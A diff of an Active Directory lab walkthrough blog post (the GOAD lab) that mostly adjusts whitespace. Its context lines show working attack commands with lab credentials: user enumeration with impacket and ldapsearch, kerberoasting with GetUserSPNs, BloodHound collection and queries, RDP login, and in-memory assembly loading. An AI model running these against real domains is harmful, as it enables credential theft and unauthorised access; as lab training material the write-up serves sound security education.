@@ -21,7 +21,6 @@ GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 
 ```
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
-
 [*] Querying north.sevenkingdoms.local for information about domain.
 Name                  Email                           PasswordLastSet      LastLogon           
 --------------------  ------------------------------  -------------------  -------------------
@@ -43,9 +42,10 @@ jeor.mormont                                          2022-06-29 07:48:37.841846
 sql_svc                                               2022-06-29 07:48:40.248028  2022-07-03 15:56:57.924607
 ```
 
-- With ldap query, i recommand this article with all the usefull ldap query for active directory : [https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)
+- With ldap query, i recommand this article with all the usefull ldap query for active directory : [https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/]
 
 - With ldap on north.sevenkingdoms.local
+
 ```shell
 ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
 ```
@@ -56,6 +56,7 @@ ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" 
 - With ldap query we can request users of the others domain because a trust is present.
 
 - On essos.local
+
 ```shell
 ldapsearch -H ldap://192.168.56.12 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"
 ```
@@ -71,10 +72,10 @@ ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" 
 - On an active directory, we will see very often users with an SPN set.
 
 - let's find them with impacket
+
 ```
 # GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
 ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
 ---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
 CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2022-06-29 07:48:32.373101  2022-06-29 10:34:54.308171  constrained 
@@ -154,6 +155,7 @@ bloodhound.py --zip -c All -d essos.local -u brandon.stark@north.sevenkingdoms.l
 - The official bloudhound ingestor is sharphound : [https://github.com/BloodHoundAD/SharpHound](https://github.com/BloodHoundAD/SharpHound)
 
 - Let's start an RDP connection
+
 ```shell
 xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
 ```
@@ -182,6 +184,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 - Now start neo4j and bloodhound (at the time of writing the python ingestor match bloodhound 4.1 be sure to get the right version)
 - Upload the zips into bloodhound
 - And now show all domains and computer
+
 ```
 MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
 ```
@@ -189,6 +192,7 @@ MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
 ![domain_computers.png](/assets/blog/GOAD/domain_computers.png)
 
 - And show all the users
+
 ```
 MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p
 ```
@@ -196,6 +200,7 @@ MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p
 ![bh_users.png](/assets/blog/GOAD/bh_users.png)
 
 - let see the overall map of domains/groups/users
+
 ```
 MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
 ```
@@ -204,6 +209,7 @@ MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
 
 
 - Let see the users ACL
+
 ```
 MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
 ```
